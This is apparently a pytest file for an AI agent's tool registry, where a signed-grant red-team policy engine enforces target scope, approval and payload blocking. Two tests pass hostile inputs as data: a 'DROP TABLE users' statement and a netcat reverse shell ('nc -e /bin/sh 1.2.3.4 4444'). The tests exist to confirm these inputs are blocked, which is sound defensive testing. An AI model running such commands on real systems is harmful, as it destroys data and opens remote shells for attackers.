"""Tool execution is gated by the signed-grant policy engine."""
from __future__ import annotations

import time

import pytest

from core.policy.red_team import (
    AuthorizationGrant,
    Profile,
    RedTeamPolicyEngine,
    ScopeTarget,
)
from core.tool_registry import (
    AuthContext,
    RiskLevel,
    Tool,
    ToolDefinition,
    ToolError,
    ToolRegistry,
    ToolResult,
)

SECRET = b"gate-test-secret"


class _FakeTool(Tool):
    def __init__(self, definition: ToolDefinition, calls: list):
        super().__init__(definition)
        self.calls = calls

    def describe(self) -> ToolDefinition:
        return self.defn

    def validate_input(self, arguments):
        for key in (self.defn.input_schema or {}).get("required", []):
            if key not in arguments:
                raise ToolError(f"missing {key}", category="VALIDATION")

    def authorize(self, ctx, arguments) -> None:
        return None

    async def execute(self, arguments, ctx) -> ToolResult:
        self.calls.append(dict(arguments))
        return ToolResult(ok=True, tool_id=self.defn.tool_id, output="executed")

    async def cancel(self, run_id: str) -> bool:
        return True

    async def health_check(self) -> bool:
        return True


def _grant(profiles=None, scope=None):
    now = time.time()
    return AuthorizationGrant.sign(
        SECRET,
        grant_id="ENG-GATE",
        authorized_by="Gate Test",
        scope=scope or [ScopeTarget("domain", "example.com")],
        not_before=now - 60,
        not_after=now + 3600,
        profiles=profiles or [Profile.RED_TEAM],
    )


def _registry(profile=Profile.RED_TEAM, *, grant=None, calls=None):
    engine = RedTeamPolicyEngine(grant or _grant(), profile, SECRET)
    registry = ToolRegistry(policy_engine=engine)
    calls = calls if calls is not None else []
    definition = ToolDefinition(
        tool_id="fake.scan",
        name="Fake Scan",
        description="test tool",
        input_schema={"required": ["target"], "properties": {"target": {"type": "string"}}},
        risk_level=RiskLevel.HIGH,
        scope_relevant=True,
    )
    registry.register(_FakeTool(definition, calls))
    return registry, calls


CTX = AuthContext(worker_id="worker-1", worker_role="tester")


@pytest.mark.asyncio
async def test_in_scope_high_risk_tool_executes_under_red_team():
    registry, calls = _registry()
    result = await registry.call_tool("fake.scan", {"target": "https://example.com/x"}, CTX)
    assert result.ok is True
    assert len(calls) == 1
    assert any(event["event"] == "policy_allowed" for event in registry.audit_log())


@pytest.mark.asyncio
async def test_out_of_scope_tool_is_blocked_before_execution():
    registry, calls = _registry()
    with pytest.raises(ToolError) as exc:
        await registry.call_tool("fake.scan", {"target": "https://example.org/x"}, CTX)
    assert exc.value.category == "POLICY_DENIED"
    assert "outside the authorized scope" in str(exc.value)
    assert calls == []


@pytest.mark.asyncio
async def test_destructive_payload_is_blocked_before_execution():
    registry, calls = _registry()
    with pytest.raises(ToolError) as exc:
        await registry.call_tool(
            "fake.scan",
            {"target": "https://example.com/x", "payload": "DROP TABLE users"},
            CTX,
        )
    assert exc.value.category == "POLICY_DENIED"
    assert "destructive" in str(exc.value)
    assert calls == []


@pytest.mark.asyncio
async def test_backdoor_payload_is_blocked_before_execution():
    registry, calls = _registry()
    with pytest.raises(ToolError) as exc:
        await registry.call_tool(
            "fake.scan",
            {"target": "https://example.com/x", "command": "nc -e /bin/sh 1.2.3.4 4444"},
            CTX,
        )
    assert exc.value.category == "POLICY_DENIED"
    assert "persistence" in str(exc.value)
    assert calls == []


@pytest.mark.asyncio
async def test_standard_profile_requires_approval_for_high_risk():
    registry, calls = _registry(Profile.STANDARD, grant=_grant(profiles=[Profile.STANDARD]))
    with pytest.raises(ToolError) as exc:
        await registry.call_tool("fake.scan", {"target": "https://example.com/x"}, CTX)
    assert exc.value.category == "APPROVAL_REQUIRED"
    assert calls == []

    result = await registry.call_tool(
        "fake.scan",
        {"target": "https://example.com/x"},
        CTX,
        approval_handler=lambda tool_id, operation: True,
    )
    assert result.ok is True
    assert len(calls) == 1


@pytest.mark.asyncio
async def test_approval_rejection_blocks_execution():
    registry, calls = _registry(Profile.STANDARD, grant=_grant(profiles=[Profile.STANDARD]))
    with pytest.raises(ToolError) as exc:
        await registry.call_tool(
            "fake.scan",
            {"target": "https://example.com/x"},
            CTX,
            approval_handler=lambda tool_id, operation: False,
        )
    assert exc.value.category == "APPROVAL_REJECTED"
    assert calls == []


@pytest.mark.asyncio
async def test_scope_relevant_tool_without_target_is_blocked():
    registry, calls = _registry()
    with pytest.raises(ToolError) as exc:
        await registry.call_tool("fake.scan", {"target": "   "}, CTX)
    assert exc.value.category == "POLICY_DENIED"
    assert calls == []


@pytest.mark.asyncio
async def test_local_tool_without_target_is_not_network_gated():
    calls = []
    registry = ToolRegistry(policy_engine=RedTeamPolicyEngine(_grant(), Profile.RED_TEAM, SECRET))
    definition = ToolDefinition(
        tool_id="local.audit",
        name="Local Audit",
        description="reads a local directory",
        input_schema={"required": ["path"], "properties": {"path": {"type": "string"}}},
        risk_level=RiskLevel.LOW,
        scope_relevant=False,
    )
    registry.register(_FakeTool(definition, calls))
    result = await registry.call_tool("local.audit", {"path": "C:/project"}, CTX)
    assert result.ok is True
    assert len(calls) == 1


@pytest.mark.asyncio
async def test_registry_without_policy_engine_keeps_previous_behaviour():
    calls = []
    registry = ToolRegistry()
    definition = ToolDefinition(
        tool_id="plain.scan",
        name="Plain Scan",
        description="no policy",
        input_schema={"required": ["target"]},
        risk_level=RiskLevel.HIGH,
        scope_relevant=True,
    )
    registry.register(_FakeTool(definition, calls))
    result = await registry.call_tool("plain.scan", {"target": "https://anything.test/"}, CTX)
    assert result.ok is True
    assert len(calls) == 1


def test_extract_target_prefers_the_first_known_key():
    from core.tool_registry import _extract_target

    assert _extract_target({"url": "https://example.com/a"}) == "https://example.com/a"
    assert _extract_target({"hosts": "ignored", "host": "api.example.com"}) == "api.example.com"
    assert _extract_target({"target": "   "}) == ""
    assert _extract_target({"target": ["https://a.example.com", "https://b.example.com"]}) == (
        "https://a.example.com"
    )
